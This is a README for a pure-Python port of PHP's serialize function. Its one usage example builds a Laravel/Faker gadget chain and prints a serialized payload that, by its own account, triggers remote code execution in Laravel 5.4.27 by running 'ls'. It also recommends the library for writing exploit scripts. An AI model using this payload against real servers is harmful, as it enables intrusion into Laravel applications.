# libphpserialize

A port of PHP's serialize function, in pure python

## Installation

`pip install libphpserialize`

## Features

- serialize objects directly from python objects
- nested objects
- namespacing
- variable Access Modifiers (public, private, protected)

## Example

```python
from phpserialize import serialize
from phpserialize.decorators import namespace
import requests


@namespace('Faker')
class Generator:
    protected_formatters = {'dispatch': 'system'}


@namespace('Illuminate\Broadcasting')
class PendingBroadcast:
    protected_event = 'ls'
    protected_events = Generator()


print(serialize(PendingBroadcast()))
```

with above code, you'll get:

```
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:15:"Faker\Generator":1:{s:13:"*formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"*event";s:2:"ls";}
```

which triggers an RCE vulnerability in Laravel 5.4.27

nice when you're writing an exploit script for others to read

## Important:

- the code is written and tested under python 3.7+
- decimal serialization doesn't work the same as PHP does, yet

## TODO

- recursive objects support
- reimplement decimal precision calculating algorithm from php engine
